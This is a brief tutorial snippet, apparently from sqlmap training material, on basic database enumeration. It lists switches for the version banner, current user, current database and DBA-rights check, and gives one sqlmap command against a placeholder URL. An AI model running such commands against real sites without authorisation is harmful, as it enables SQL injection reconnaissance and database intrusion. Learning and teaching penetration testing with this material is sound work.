# Basic Database Enumeration

Enumeration usually starts with the retrieval of the basic information:

- Database version banner (switch `--banner`)
- Current user name (switch `--current-user`)
- Current database name (switch `--current-db`)
- Checking if the current user has DBA (administrator) rights (switch `--is-dba`)

```sh
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

